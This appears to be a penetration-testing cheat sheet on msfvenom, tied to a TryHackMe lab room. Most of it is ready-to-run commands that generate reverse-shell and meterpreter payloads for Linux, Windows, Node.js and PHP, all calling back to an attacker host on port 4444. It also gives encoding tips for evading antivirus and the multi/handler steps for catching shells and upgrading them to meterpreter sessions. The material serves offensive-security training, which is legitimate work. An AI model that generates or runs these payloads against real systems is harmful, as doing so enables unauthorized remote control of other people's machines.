# 🐍 msfvenom 🐍

[![metasploitexploitation](../../../_badges/thmp/metasploitexploitation.svg)](https://tryhackme.com/room/metasploitexploitation)

You can use msfvenom to generate all kinds of reverse shells.

<div class="row row-cols-md-2"><div>

* List payloads

```bash
$ msfvenom --list payloads
# payload opening a meterpreter - see metasploit below
$ msfvenom --list payloads | grep meterpreter
```

Selecting a payload can be a thorough process, as this choice is determined by the operating system (platform), the firewall <small>(=the kind of connection allowed)</small>, the antivirus, the program available to execute the reverse shell (php, python...)...

</div><div>

There are two categories of payloads: **single/inline/stageless**, and **staged** payloads. The main difference is that staged payloads are sent in two steps. First, a simple payload (called stager) is sent, which then request the rest of the payload. They are mainly used when there is a restriction on the size of the payload.

In Metasploit, the `_` is replaced with a `/` for staged payloads.

* `php/meterpreter_reverse_tcp`: inline/single
* `php/meterpreter/reverse_tcp`: staged
</div></div>

<hr class="sep-both">

## 📝 Common options 📝

<div class="row row-cols-md-2"><div>

The first parameter is `-p` which define the kind of reverse shell you want.

```bash
$ msfvenom -p cmd/unix/reverse_netcat [...]
```

You need to provide information that the machine will use to connect back: `LHOST` <small>(you IP address, or `tun0` if using a VPN)</small>, and `LPORT` <small>(you local port)</small>.

```bash
$ msfvenom [...] LHOST=tun0 LPORT=4444 [...]
```
</div><div>

You will want to either generate an executable (.exe, .elf...) or generate some raw code (php, js...). You can do that with `-f`.

```bash
$ msfvenom [...] -f raw
$ msfvenom [...] R # same for RAW
```
</div></div>

<hr class="sep-both">

## 👻 Antivirus and firewall evasion 👻

<div class="row row-cols-md-2"><div>

You can encode the payload, to make it harder to detect, or smaller/...

```bash
$ msfvenom [...] -e php/base64
```
</div><div>

You can use [web delivery](https://www.offensive-security.com/metasploit-unleashed/web-delivery/). For instance, if you want to open a reverse shell on a host in which you got a powershell

* set the target: powershell
* set other options <small>(LHOST...)</small>
* run
* paste the code prompted in the terminal
* done
</div></div>

<hr class="sep-both">

## 📌 Some payloads 📌

All examples are asking the target to connect back to `tun0` IP at the port `4444`.

<div class="row row-cols-md-2 mt-3"><div>

* **Linux** (.elf / ...)

```bash
# execute /bin/bash -p
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
# Generate a .elf opening a reverse shell (TCP)
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
# Output a command (RAW) opening a reverse shell with netcat
$ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 -f raw
```

* **Windows** (.exe / .msi / ...)

```bash
# Generate a .exe opening a reverse shell (TCP)
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
```
</div><div>

* **Node.js**

```bash
# Generate a .js opening a reverse shell (TCP)
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444 -o shell.js
```

* **PHP**

```bash
# very instable shell, not recommended
$ msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o revshell.php
# meterpreter
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o revshell.php
```
</div></div>

<hr class="sep-both">

## 🕸️ Catch reverse shells with Metasploit 🕸️

<div class="row row-cols-md-2"><div>

You can use the metasploit console to catch a reverse shell, which may or may not be a reverse shell. You can then upgrade it to a meterpreter shell, and use a lot of commands/... provided by the framework.

```bash
$ msfconsole -q
msf6 > use multi/handler
msf6 exploit('multi/handler') > setg LHOST tun0
msf6 exploit('multi/handler') > setg LPORT 4444
# for instance, to catch a php/meterpreter/reverse_tcp
msf6 exploit('multi/handler') > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit('multi/handler') > run
# then wait for a connection
# then you meterpreter will pop
meterpreter> help # see what you can do
# refer to the metasploit course
```
</div><div>

If you are using this with a non-meterpreter bind/reverse shell

```bash
# run the exploit as a job (in the background)
msf6 exploit('multi/handler') > run -j
[XXX Session 1 XXX]
# upgrade session 1 to a meterpreter
msf6 exploit('multi/handler') > sessions -u 1
[XXX Session 2 XXX]
# move to the upgraded meterpreter
msf6 exploit('multi/handler') > sessions -i 2
meterpreter> help
```
</div></div>